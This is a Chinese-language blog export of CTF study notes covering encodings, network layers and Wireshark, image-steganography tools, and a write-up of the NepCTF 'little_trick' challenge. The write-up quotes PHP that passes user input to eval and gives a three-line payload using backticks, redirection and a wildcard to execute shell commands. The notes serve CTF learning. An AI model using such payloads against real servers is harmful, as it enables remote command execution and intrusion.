<p>base16：使用数字0-9和字母A-F16个字符对任意字节数据进行编码。tips：不会出现=</p>
<p>base36：包含0-9加上所有的26个字母，不区分大小写，不包含任何标点，所有的字母要么全大写要么全小写。特点：加密仅支持整数数字，解密仅支持字符串，不支持中文。</p>
<p>base58：采用的字符集为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，由纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。</p>
<p>base62：26个字母的大小写再加上0-9，相比于base64只是去掉了两个符号（+和/）</p>
<p>base85：类似于base64的二进制文本编码形式，通过使用五个ascii字符表示四个字节的二进制数据，它可用于将图像嵌入到Adobe PDF文件中。</p>
<p>base91：由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}”）组成</p>
<p>base92：比base91多一个字符~</p>
<h2 id="morse："><a href="#morse：" class="headerlink" title="morse："></a>morse：</h2><p>莫尔斯电码，一种早期的数字化通信形式，由 ‘.’ 和 ‘-‘ 组成</p>
<h2 id="shellcode："><a href="#shellcode：" class="headerlink" title="shellcode："></a>shellcode：</h2><p>一段利用软件漏洞而执行的代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而得名，通常用16进制（如\x55\x68）来表示，可以用16进制格式来表示其他隐写信息。</p>
<h2 id="urlencode、unicode"><a href="#urlencode、unicode" class="headerlink" title="urlencode、unicode"></a>urlencode、unicode</h2><p>urlencode：url编码又叫百分号编码，是统一资源定位(URL)编码方式。<br>URL地址（常说网址）规定了常用的数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。<br>编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p>
<p>unicode：中文又称万国码、国际码、统一码、单一码，是计算机科学领域的业界标准。它整理、编码了世界上大部分的文字系统，使得电脑可以用更为简单的方式来呈现和处理文字。<br>Unicode伴随着通用字符集的标准而发展，同时也以书本的形式对外发表。Unicode至今仍在不断增修，每个新版本都加入更多新的字符。</p>
<h2 id="aaencode、jjencode、uuencode"><a href="#aaencode、jjencode、uuencode" class="headerlink" title="aaencode、jjencode、uuencode"></a>aaencode、jjencode、uuencode</h2><p>aaencode：可以将js代码转换成常用的网络表情，也就是我们所说的颜文字js加密</p>
<p>jjencode：由$=~[]{}()_+.;!&quot;“组成</p>
<p>uuencode：Uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。Uuencode编码方案常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。例如：2Y9V/Y:6SY+JZY+B’Y;*![[R!`</p>
<h2 id="Jsfuck、brainfuck、ook！、short-ook！"><a href="#Jsfuck、brainfuck、ook！、short-ook！" class="headerlink" title="Jsfuck、brainfuck、ook！、short ook！"></a>Jsfuck、brainfuck、ook！、short ook！</h2><p>jsfuck：用六个字符<a href=""></a>!+来编写javascript程序，直接在浏览器F12的console控制台解码即可。</p>
<p>brainfuck：由+&lt;&gt;[].-组成</p>
<p>ook!：全部由ook.!?组成</p>
<p>short ook！：由.!?组成</p>
<h2 id="敲击码："><a href="#敲击码：" class="headerlink" title="敲击码："></a>敲击码：</h2><p>是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的，不同点是是用 K 字母被整合到 C 中。</p>
<h2 id="二维码："><a href="#二维码：" class="headerlink" title="二维码："></a>二维码：</h2><p>用某种特定几何图形按一定规律在平面分步的黑白相间的图形记录数据符号信息。</p>
<p>线性堆叠式二维码  PDF417、U1tracode、Code49、Code 16K</p>
<p>矩阵式二维码 Data Matrix、Maxi Code、Aztec Code、QP Code、Vericode</p>
<p>邮政码  主要用于邮件编码  POSTNET、BPO 4-STATE</p>
<p>QR码的特点</p>
<p>存储大容量信息</p>
<p>传统的条形码只能处理20位左右的信息量，与此相比，QR码可处理条形码的几十倍到几百倍的信息量。</p>
<p>另外，QR码还可以支持所有类型的数据。（如：数字、英文字母、日文字母、汉字、符号、二进制、控制码等）。一个QR码最多可以处理7089字(仅用数字时)的巨大信息量。</p>
<p>在小空间内打印</p>
<p>QR码使用纵向和横向两个方向处理数据，如果是相同的信息量，QR码所占空间为条形码的十分之一左右。(还支持Micro QR码，可以在更小空间内处理数据。)</p>
<p>QR码的基本结构</p>
<p>QR(Quick-Response) code是被广泛使用的一种二维码，解码速度快。</p>
<p>格式信息：纠错等级</p>
<p>版本信息：即二维码的规格，QR码符号共有40种规格的矩阵</p>
<p>二维码常见考题：</p>
<p>1.修补定位符</p>
<p>2.基于纠错等级，只给你一半的信息，需要把剩下的补全。用QRazyBox项目修补</p>
<h2 id="稀奇古怪的编码"><a href="#稀奇古怪的编码" class="headerlink" title="稀奇古怪的编码"></a>稀奇古怪的编码</h2><p>社会主义核心价值观、与佛论禅、与熊论道</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=3" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=3</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>misc之流量分析</title>
    <url>/2021/02/06/flow-analysis/</url>
    <content><![CDATA[<h1 id="互联网五层模型"><a href="#互联网五层模型" class="headerlink" title="互联网五层模型"></a>互联网五层模型</h1><p>防火墙截取的网络攻击流在公安机关对网络攻击的取证中，流量分析往往是非常重要的一个环节，通过分析流量，我们能获得许多线索。在学习流量分析之前，我们需要明白一些网络的基础知识。<a id="more"></a></p>
<p>常见的网络五层模型，自下而上为物理层、数据链路层、网络层、传输层、应用层(osi七层模型里把应用层扩展为会话层、表示层和应用层)</p>
<p>实际上它并不是一个层次关系，而是包含关系，即每一层都包含所有上层信息</p>
<p>在我们使用抓包软件进行流量分析的时候，抓到的包往往含有数据链路层、网络层、传输层和应用层四个部分，其中每一部分在传递到不同的层面的时候会被利用并丢弃。Wireshark抓的包工作在数据链路层，而burpsuite抓的http包则工作在应用层。</p>
<p>物理层传输方式：WIFI无线通信通过电磁波传输、网线通过网线里的金属芯进行传输信息，光纤通过光导纤维传输信息。</p>
<p>由于不同的物理传输方式就导致网络通信之间需要一个统一的标准，这里的标准就是网络的标准，网络的标准就是将物理层的信号调制解调成标准的以太网的传输格式，之后就可以在本地局域网进行传输，不同的局域网互相连接形成了大千世界的互联网。</p>
<p>物理层传输到的信息会被计算机把里面的物理信号调制解调成数据链路层的信号也就是以太帧这样的信号，当信号传到物理层后，物理层的那一部分被剥去，然后传递到数据链路层，剥去数据链路层的信息，传给网络层，剥去网络层信息，传给传输层，剥去传输层信息，传给应用层</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/2.png" alt="2"></p>
<p><a href="https://blog.csdn.net/yonggeit/article/details/72857630" target="_blank" rel="noopener">用户访问网站基本流程及原理(史上最全,没有之一)</a></p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>当两台计算机相连直接通信的时候，发挥主要作用的是物理层。<br>计算机将信号发送到网线上，另外一台计算机负责接收。<br>假如我们将第三台电脑通过集线器（hub）相连，相当于三台计算机同时连接在同一根导线上，一台计算机发送的信号，会被其他两台计算机同时收到，但是容易被黑客监听，不够安全，也有可能发生信号冲突</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234806315.png" alt="image-20210205234806315"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234811050.png" alt="image-20210205234811050"></p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>当多台计算机通过交换机（switch）相连的时候，他们采用的通信方式是数据链路层的协议，如下图所示，每一台计算机都分配了对应的MAC地址，当某台计算机想通过给另外一个计算机发送消息时，需要在以太帧头中指明发送方和接收方的地址，交换机在接收到信号之后会根据这个地址正确将信号转发至某一端口（即网线），从而避免了网络内所有计算机都能收到信号。以太帧中的数据包是我们想要传输的信息，包括接下来的IP数据包。(每台电脑上面的网卡都有一个独一无二的MAC地址，网卡生产出来之后，这个物理地址就确定了)，交换机相当于打通了一个数据链路。发送给一个电脑，目的mac地址写相应MAC地址，相当于单播如果想发送给其他所有电脑，目的man地址可以写全都是0，相当于广播地址。路由器既能广播发送，也能分别发送，这样就提高了安全性，虽然提高了安全性，但也存在一个问题，如果某台电脑网卡坏了，换一个网卡，那么MAC地址就会变化，那么路由器又要问这台电脑mac地址并在缓存里面刷新一次，这样就非常麻烦，因此就出现了网络层(IP地址网络协议)</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234831058.png" alt="image-20210205234831058"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234836584.png" alt="image-20210205234836584"></p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>给每个电脑都分配一个虚拟地址也就是IP地址，IP地址和MAC地址的关系可以是一对多也可以多对一，一个mac地址可以分配给多个IP，或者同一个IP可以被多个MAC地址所使用。比如我电脑的网卡坏了，我去换了个新的网卡，IP我还是用原来的IP，于是就根据原来的IP，把这个IP转换成mac地址，再进行通信，这样的话就不用告诉交换机我的MAC地址就能直接通信了。完成IP地址转换成MAC地址的协议叫ARP协议，即将网络地址转换成物理地址。</p>
<p>当我们计算机的网络较为大且复杂的时候，我们使用简单的MAC地址并不能很好的管理网络，因为MAC地址是和硬件绑定的，因为假如我们更换了计算机设备，那么就需要重新配置网络的信息。这个时候IP地址网络协议就诞生了。IP地址和MAC地址通过Arp协议进行转换。其中路由器的存在使得计算机之间能够跨网段访问。如图所示的网络的三个区域的网段分别是192.168.0.0/24、 192.168.1.0/24、 192.168.2.0/24，网关则是路由器连接每个网段的接口，比如192.168.0.1、192.168.1.1、192.168.2.1，计算机想要跨网段通信时，需要把消息转发给路由器上面的网关，路由器再根据IP地址接着转发。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234853733.png" alt="image-20210205234853733"></p>
<p>下图是arp协议将物理地址转化为网络地址</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210205234910913.png" alt="image-20210205234910913"></p>
<p>网络层还有很多其他的用途，比如我想广播一段数据，我广播的数据只有我这个网段能听到，别的网段听不到，比如说一家公司有财务部、技术部、市场部等等，我广播的数据只希望财务部听到而技术部听不到，但是我又想让技术部的人听到，那么我这个电脑会访问路由器，也就是对于我们的网络层新加了路由器这个设备，发送信息时首先会对照一下我传的这个IP它跟我是不是同一个网段的，发现不是同一个网段的就发给路由器，路由器充当一个网关的角色，发给路由器之后路由器会重复ARP的工作寻找哪个电脑的IP是我要发送的，然后那台电脑收到了这个响应之后就会回复路由器，然后路由器就把消息转发给它，路由器相当于做了一个跨网段转发的工作。</p>
<p>为什么家庭网络没有叫做交换机或者集线器(hub)的说法呢？原因是我们家用的路由器里面既集成了交换机也集成了路由器同时还集成了一些WIFI-AP(WirelessAccessPoint无线接入点)的这种功能也就是将有线网络转换成无线网络。</p>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>在网络层的基础上，我们完成了数据通过IP地址的传送，但是我们仍然要确保数据传输的可靠性。Tcp就是这样的一种协议，他具有多种特性，如使用三次握手的方法确保连接畅通，通过端口的方法来区分不同的连接。</p>
<p>大致流程如下：<br>客户端向服务端发送一个请求连接包 ，标识符为SYN序号为 J<br>服务端、收到请求连接包，并对SYN J进行确认，然后发送一个回复包，标识符为SYN K, ACK J+1<br>客户端向服务端发一个确认收到回复包，标识符为ACK K+1<br>这样就完成了三次握手。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/1.png" alt="1"></p>
<p>三次握手在wireshark中抓包如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206144006690.png" alt="image-20210206144006690"></p>
<p>UDP协议也是传输层的一种，但它是不可靠的，因为它是一个非连接的协议，它的数据包发出去后不管后续情况有没有收到，是不能确定对方是否收到的一种数据包。但是TCP是面向连接的协议，在收发数据前必须和对方建立可靠的连接。</p>
<p>加密的HTTPS协议本质上是TCP协议，它是在HTTP协议与TCP协议之间添加SSL/TLS层，利用SSL/TLS来加密数据</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>HTTP协议是最典型的应用层协议之一，应用层还有很多其他协议，比如SSH,SMTP等等，它们都是基于TCP或者UDP协议或者说传输层协议来做的</p>
<p>HTTP报文由请求报文和响应报文组成。常见的HTTP报文类型有GET/POST</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206144908023.png" alt="image-20210206144908023"></p>
<p>wireshark中http请求报文</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206144954047.png" alt="image-20210206144954047"></p>
<p>http响应报文</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206145121136.png" alt="image-20210206145121136"></p>
<h1 id="Wireshark的基本使用"><a href="#Wireshark的基本使用" class="headerlink" title="Wireshark的基本使用"></a>Wireshark的基本使用</h1><p>进入wireshark，首先选择需要监听的网卡，之后wireshark会进入监听状态，可以点击任意数据包查看相关数据内容</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206145746206.png" alt="image-20210206145746206"></p>
<p>在wireshark上方过滤器中通过输入相应规则来过滤流量，最简单的就是各种协议名比如http数据包，当然https协议外层有tls封装，所以我们只能抓到https的加密流量。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206153638995.png" alt="image-20210206153638995"></p>
<p>Wireshark里搜索tls或者ssl，来获取https协议的流量，因为https是加密的，加密协议即为tls。</p>
<p>可以使用如下方法导出wireshark中所有的http包的数据</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206162445938.png" alt="image-20210206162445938"></p>
<p>也可以在某个tcp包上面选择右键-follow tcp stream(追踪流),从而获取一整个tcp连接的数据</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206162508909.png" alt="image-20210206162508909"></p>
<p>可以用nc(netcat)或者ncat来实现TCP传输数据，下面贴上国光大佬的教程，写的很详细。</p>
<p><a href="https://www.sqlsec.com/2019/10/nc.html" target="_blank" rel="noopener">nc命令教程|国光</a></p>
<p>另外比较有意思的是，ncat有个监听模式选择叫–chat，可以当作一个聊天服务器拿来用，比如在服务器上执行ncat -lk 8888 –chat，然后自己用电脑连ncat 服务器IP 8888即可，我没有服务器，所以只能自己开个虚拟机玩玩了，没有多人聊天的感觉。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206154921598.png" alt="image-20210206154921598"></p>
<p>使用wireshark嗅探出了大量的数据之后，可以把这些流量保存为一个pcapng格式的文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206162630004.png" alt="image-20210206162630004"></p>
<p>在常见的ctf赛题中，往往是给出一个pcapng文件，需要我们读取这个流量文件，然后从中寻找flag。如果是较为简单的题，直接查找(Ctrl+F选择字符串)即可获得flag</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210206163245033.png" alt="image-20210206163245033"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=4" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=4</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>misc入门之图片隐写</title>
    <url>/2021/02/03/introduction-to-misc/</url>
    <content><![CDATA[<p>misc</p>
<h1 id="主要类型："><a href="#主要类型：" class="headerlink" title="主要类型："></a>主要类型：</h1><h2 id="1-数据编码、图形密码"><a href="#1-数据编码、图形密码" class="headerlink" title="1.数据编码、图形密码"></a>1.数据编码、图形密码</h2><h2 id="2-图片隐写"><a href="#2-图片隐写" class="headerlink" title="2.图片隐写"></a>2.图片隐写</h2><h2 id="3-音频-amp-视频隐写"><a href="#3-音频-amp-视频隐写" class="headerlink" title="3.音频&amp;视频隐写"></a>3.音频&amp;视频隐写</h2><a id="more"></a>
<h2 id="4-流量分析"><a href="#4-流量分析" class="headerlink" title="4.流量分析"></a>4.流量分析</h2><h2 id="5-内存取证-在磁盘里隐藏一些东西"><a href="#5-内存取证-在磁盘里隐藏一些东西" class="headerlink" title="5.内存取证-在磁盘里隐藏一些东西"></a>5.内存取证-在磁盘里隐藏一些东西</h2><h2 id="6-游戏隐写-打通关获得flag或者游戏中的地图之类的信息"><a href="#6-游戏隐写-打通关获得flag或者游戏中的地图之类的信息" class="headerlink" title="6.游戏隐写-打通关获得flag或者游戏中的地图之类的信息"></a>6.游戏隐写-打通关获得flag或者游戏中的地图之类的信息</h2><h1 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h1><h2 id="010editor-winhex"><a href="#010editor-winhex" class="headerlink" title="010editor/winhex"></a>010editor/winhex</h2><h2 id="图片十六进制文件头文件尾-文件模板"><a href="#图片十六进制文件头文件尾-文件模板" class="headerlink" title="图片十六进制文件头文件尾+文件模板"></a>图片十六进制文件头文件尾+文件模板</h2><h2 id="文件属性-exiftools"><a href="#文件属性-exiftools" class="headerlink" title="文件属性(exiftools)"></a>文件属性(exiftools)</h2><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><h1 id="010editor："><a href="#010editor：" class="headerlink" title="010editor："></a>010editor：</h1><p>一个字节由两位十六进制数组成</p>
<p>010左侧显示十六进制右侧显示字符串，如果一个字节不能显示成字符，则会显示成”.”</p>
<p>alt+4打开模板,没有模板的文件可以用F5加载模板</p>
<p>010里复制是ctrl+shift+c粘贴是v，kali同理</p>
<p>010里找不到图片的宽高，可以用图片文件属性的像素值(十进制)，然后转换成十六进制，再在010里搜索找到第一个，然后可以进行修改等<br>文件头到文件尾为图片内容，其余部分为多余或隐藏内容</p>
<h1 id="文件头尾："><a href="#文件头尾：" class="headerlink" title="文件头尾："></a>文件头尾：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 </span><br><span class="line">ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　  文件尾：50 4B</span><br><span class="line">kdmv                                    文件头：4B444D56</span><br><span class="line">TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 </span><br><span class="line">CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  </span><br><span class="line">XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 </span><br><span class="line">HTML (html)，                           文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，                         文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，      文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，                    文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，                  文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，               文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，                         文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，         文件头：E3828596</span><br><span class="line">RAR Archive (rar)，                    文件头：52617221</span><br><span class="line">Wave (wav)，                            文件头：57415645</span><br><span class="line">AVI (avi)，                                 文件头：41564920</span><br><span class="line">Real Audio (ram)，                     文件头：2E7261FD</span><br><span class="line">Real Media (rm)，                       文件头：2E524D46</span><br><span class="line">MPEG (mpg)，                           文件头：000001BA</span><br><span class="line">MPEG (mpg)，                           文件头：000001B3</span><br><span class="line">Quicktime (mov)，                     文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，               文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                              文件头：4D546864</span><br></pre></td></tr></table></figure>

<h1 id="图片隐写分类："><a href="#图片隐写分类：" class="headerlink" title="图片隐写分类："></a>图片隐写分类：</h1><h2 id="简单类隐写："><a href="#简单类隐写：" class="headerlink" title="简单类隐写："></a>简单类隐写：</h2><h3 id="1-属性"><a href="#1-属性" class="headerlink" title="1.属性"></a>1.属性</h3><h3 id="2-文件末尾藏字符串"><a href="#2-文件末尾藏字符串" class="headerlink" title="2.文件末尾藏字符串"></a>2.文件末尾藏字符串</h3><h3 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h3><h3 id="4-修改文件头"><a href="#4-修改文件头" class="headerlink" title="4.修改文件头"></a>4.修改文件头</h3><h2 id="图种隐写："><a href="#图种隐写：" class="headerlink" title="图种隐写："></a>图种隐写：</h2><h3 id="5-gif动图-用PS或者stegsolve查看每一帧"><a href="#5-gif动图-用PS或者stegsolve查看每一帧" class="headerlink" title="5.gif动图-用PS或者stegsolve查看每一帧"></a>5.gif动图-用PS或者stegsolve查看每一帧</h3><h3 id="6-png（bmp）"><a href="#6-png（bmp）" class="headerlink" title="6.png（bmp）"></a>6.png（bmp）</h3><h3 id="7-jpg"><a href="#7-jpg" class="headerlink" title="7.jpg"></a>7.jpg</h3><h2 id="特征明显的隐写："><a href="#特征明显的隐写：" class="headerlink" title="特征明显的隐写："></a>特征明显的隐写：</h2><h3 id="8-双图隐写"><a href="#8-双图隐写" class="headerlink" title="8.双图隐写"></a>8.双图隐写</h3><h3 id="9-stegpy"><a href="#9-stegpy" class="headerlink" title="9.stegpy"></a>9.stegpy</h3><h3 id="10-silenteye"><a href="#10-silenteye" class="headerlink" title="10.silenteye"></a>10.silenteye</h3><h1 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h1><p>一张图片文件尾后面藏着另一张图片，通过查找文件头文件尾判断</p>
<p>直接在010editor里新建一个文件，把后面的十六进制复制到新建文件保存为正确后缀名就可以分离出来</p>
<h1 id="kali-1"><a href="#kali-1" class="headerlink" title="kali:"></a>kali:</h1><h2 id="1-strings命令：查找可打印的字符串，以换行符或空字符结束"><a href="#1-strings命令：查找可打印的字符串，以换行符或空字符结束" class="headerlink" title="1.strings命令：查找可打印的字符串，以换行符或空字符结束"></a>1.strings命令：查找可打印的字符串，以换行符或空字符结束</h2><p>strings file | grep pass可以查找文件中指定的字符串</p>
<h2 id="2-grep命令：查找文件里符合条件的字符串"><a href="#2-grep命令：查找文件里符合条件的字符串" class="headerlink" title="2.grep命令：查找文件里符合条件的字符串"></a>2.grep命令：查找文件里符合条件的字符串</h2><p>-a 不忽略二进制数据<br>grep -a “xxx” file</p>
<h2 id="3-file命令：用来探测给定文件的类型"><a href="#3-file命令：用来探测给定文件的类型" class="headerlink" title="3.file命令：用来探测给定文件的类型"></a>3.file命令：用来探测给定文件的类型</h2><h2 id="4-binwalk工具分离文件"><a href="#4-binwalk工具分离文件" class="headerlink" title="4.binwalk工具分离文件"></a>4.binwalk工具分离文件</h2><p>binwalk -e file提取文件<br>binwalk -D/-dd=jpeg file分解指定类型文件</p>
<h2 id="5-foremost工具分离所有文件"><a href="#5-foremost工具分离所有文件" class="headerlink" title="5.foremost工具分离所有文件"></a>5.foremost工具分离所有文件</h2><p>foremost file 会得到一个output文件夹</p>
<h2 id="6-dd命令分离指定文件"><a href="#6-dd命令分离指定文件" class="headerlink" title="6.dd命令分离指定文件"></a>6.dd命令分离指定文件</h2><p>dd if=file of=输出文件 bs=1 skip=24437  //bs设置每次读取1块，skip是指从文件开头跳过24437个块开始复制，这个值可以用binwalk来查看</p>
<h1 id="gif图种："><a href="#gif图种：" class="headerlink" title="gif图种："></a>gif图种：</h1><p>用PS或者stegsolve查看每一帧</p>
<p>用Ulead gif工具查看帧的时间间隔，可以把时间间隔换成二进制、莫斯或者培根之类的</p>
<h1 id="png（bmp）图种："><a href="#png（bmp）图种：" class="headerlink" title="png（bmp）图种："></a>png（bmp）图种：</h1><p>破坏文件头一定不能显示，破坏文件尾还有可能能显示</p>
<p>png图片有IHDR(文件头数据块header chunk)和IDAT(图像数据块image data chunk)和IEND(图像结束数据块image end data chunk)<br>IHDR包含图片的宽和高和颜色等基本信息，因此可以在IHDR里修改宽和高<br>有些题目会把png文件头删了，所以看到IHDR和IDAT时，就可以判断为png文件，把文件头加上</p>
<p>CRC即循环冗余校验</p>
<p>CRC校验码由文件头数据块标识和IHDR共十七位字节进行CRC计算得到，后面四个字节为该png图片的CRC32校验值</p>
<p>利用CRC校验可以用python脚本爆破png图片的正确高和宽</p>
<p>通过010的工具计算校验值，若不相同则应该把高度调大，一般都是调大</p>
<p>pngcheck工具：</p>
<p>pngcheck.win64.exe -v file查看文件块IDAT，正常的块在65524的时候就满了，若有的IDAT块没有到65524，则这个IDAT块是有问题的，因为他本来应该并入到上一个块里。</p>
<h1 id="zlib隐写："><a href="#zlib隐写：" class="headerlink" title="zlib隐写："></a>zlib隐写：</h1><p>zlib是一种数据格式，用于存储压缩后的数据</p>
<p>查看异常的IDAT块，78 9C是zlib压缩的标志</p>
<p>把从78 9C到00之前的内容复制到python脚本可以解压缩zlib内容，也可以用binwalk -e file直接分解出flag</p>
<h1 id="lsb隐写："><a href="#lsb隐写：" class="headerlink" title="lsb隐写："></a>lsb隐写：</h1><p>最低有效位隐写，原理就是图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，在人眼看来是看不出来区别的，也把信息隐藏起来了。譬如我们想把’A’隐藏进来的话，如下图，就可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/640760-20160129212637693-390049790.png" alt="test1"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/640760-20160129212704114-2030955630.png" alt="test2"></p>
<p>可以用stegsolve查看RGB通道的最低位，然后用data extract查看ascii值<br>stegsolve中Alpha是透明度的颜色通道</p>
<p>也可以用zsteg工具查看通道信息</p>
<p>kali里zsteg file查看lsb信息或者zsteg file -a尝试所有已知的组合</p>
<p>导出内容：zsteg -e 所在通道 file &gt; 输出文件名</p>
<p>之所以归类在png（bmp）图种是因为png是无损压缩，bmp是没有经过压缩的，你修改的信息不会丢失，而像jpg图片对像素进行了有损压缩，你修改的信息可能会被压缩的过程破坏。</p>
<p>加密lsb隐写，用cloacked-pixel工具的lsb.py脚本来解</p>
<p><code>python2 lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</code></p>
<p>bmp或者pdf文件解密可以用wbStego4.3open工具直接解密</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=2" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=2</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>nepctf-little_trick</title>
    <url>/2021/03/24/nepctf-little_trick/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>萌新第一次认真做题，结果连签到都签不上，(惨惨。<a id="more"></a>盯着little_trick看了好久，看出来是个命令执行题目，nep最多只有12个字符，但是len必须小于8，一开始我想的是len=-12，然后nep里用exec去执行命令，但是不知道哪里出问题了不太行。赛后问了出题人，我去查了下substr函数才知道，我当时对substr理解不到位。(lll￢ω￢)</p>
<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>命令执行</p>
<p>用反引号执行系统命令，php的一个小trick。</p>
<p>利用大于号&gt;创建文件</p>
<p>利用通配符*把目录下列出的第一个文件当作命令 剩下的当作参数执行(linux默认按文件名字典序排序)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $nep &#x3D; $_GET[&#39;nep&#39;];</span><br><span class="line">  $len &#x3D; $_GET[&#39;len&#39;];</span><br><span class="line">  if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;</span><br><span class="line">    eval(substr($nep,0,$len));</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&#39;too long!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7</span><br><span class="line">nep&#x3D;&#96;&gt;cat&#96;;&amp;len&#x3D;7</span><br><span class="line">nep&#x3D;&#96;*&gt;z&#96;;&amp;len&#x3D;6</span><br></pre></td></tr></table></figure>

